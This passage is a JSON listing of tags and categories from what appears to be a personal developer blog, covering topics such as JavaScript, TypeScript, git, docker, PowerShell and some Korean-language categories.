theme","slug":"dark-theme","link":"/tags/dark-theme/"},{"name":"contribution","slug":"contribution","link":"/tags/contribution/"},{"name":"utterances","slug":"utterances","link":"/tags/utterances/"},{"name":"PowerShell","slug":"PowerShell","link":"/tags/PowerShell/"},{"name":"BEM","slug":"BEM","link":"/tags/BEM/"},{"name":"keyword","slug":"keyword","link":"/tags/keyword/"},{"name":"GTD","slug":"GTD","link":"/tags/GTD/"},{"name":"port forwarding","slug":"port-forwarding","link":"/tags/port-forwarding/"},{"name":"contributions calendar","slug":"contributions-calendar","link":"/tags/contributions-calendar/"},{"name":"datalist","slug":"datalist","link":"/tags/datalist/"},{"name":"package","slug":"package","link":"/tags/package/"},{"name":"ReturnType","slug":"ReturnType","link":"/tags/ReturnType/"},{"name":"SSR","slug":"SSR","link":"/tags/SSR/"},{"name":"CSR","slug":"CSR","link":"/tags/CSR/"},{"name":"transition timing function","slug":"transition-timing-function","link":"/tags/transition-timing-function/"},{"name":"router","slug":"router","link":"/tags/router/"},{"name":"home","slug":"home","link":"/tags/home/"},{"name":"overloading","slug":"overloading","link":"/tags/overloading/"},{"name":"overriding","slug":"overriding","link":"/tags/overriding/"},{"name":"defer","slug":"defer","link":"/tags/defer/"},{"name":"debounce","slug":"debounce","link":"/tags/debounce/"},{"name":"throttle","slug":"throttle","link":"/tags/throttle/"},{"name":"jest","slug":"jest","link":"/tags/jest/"},{"name":"secure contexts","slug":"secure-contexts","link":"/tags/secure-contexts/"},{"name":"archiving-repositories","slug":"archiving-repositories","link":"/tags/archiving-repositories/"},{"name":"tldr","slug":"tldr","link":"/tags/tldr/"},{"name":"pat","slug":"pat","link":"/tags/pat/"},{"name":"lastIndex","slug":"lastIndex","link":"/tags/lastIndex/"},{"name":"unary plus","slug":"unary-plus","link":"/tags/unary-plus/"},{"name":"snippet","slug":"snippet","link":"/tags/snippet/"},{"name":"spread syntax","slug":"spread-syntax","link":"/tags/spread-syntax/"}],"categories":[{"name":"nodejs","slug":"nodejs","link":"/categories/nodejs/"},{"name":"git","slug":"git","link":"/categories/git/"},{"name":"react","slug":"react","link":"/categories/react/"},{"name":"aws","slug":"aws","link":"/categories/aws/"},{"name":"programmers","slug":"programmers","link":"/categories/programmers/"},{"name":"blog history","slug":"blog-history","link":"/categories/blog-history/"},{"name":"windows","slug":"windows","link":"/categories/windows/"},{"name":"sql","slug":"sql","link":"/categories/sql/"},{"name":"web","slug":"web","link":"/categories/web/"},{"name":"vscode","slug":"vscode","link":"/categories/vscode/"},{"name":"etc","slug":"etc","link":"/categories/etc/"},{"name":"java","slug":"java","link":"/categories/java/"},{"name":"typescript","slug":"typescript","link":"/categories/typescript/"},{"name":"blog","slug":"blog","link":"/categories/blog/"},{"name":"cmd","slug":"cmd","link":"/categories/cmd/"},{"name":"docker","slug":"docker","link":"/categories/docker/"},{"name":"markdown","slug":"markdown","link":"/categories/markdown/"},{"name":"playlist","slug":"playlist","link":"/categories/playlist/"},{"name":"swift","slug":"swift","link":"/categories/swift/"},{"name":"bash","slug":"bash","link":"/categories/bash/"},{"name":"unity","slug":"unity","link":"/categories/unity/"},{"name":"생각","slug":"생각","link":"/categories/%EC%83%9D%EA%B0%81/"},{"name":"open api","slug":"open-api","link":"/categories/open-api/"},{"name":"reg exp","slug":"reg-exp","link":"/categories/reg-exp/"},{"name":"정보처리기사","slug":"정보처리기사","link":"/categories/%EC%A0%95%EB%B3%B4%EC%B2%98%EB%A6%AC%EA%B8%B0%EC%82%AC/"},{"name":"kakao api","slug":"kakao-api","link":"/categories/kakao-api/"},{"name":"telegram","slug":"telegram","link":"/categories/telegram/"},{"name":"javascript","slug":"javascript","link":"/categories/javascript/"},{"name":"keyword","slug":"keyword","link":"/categories/keyword/"}]}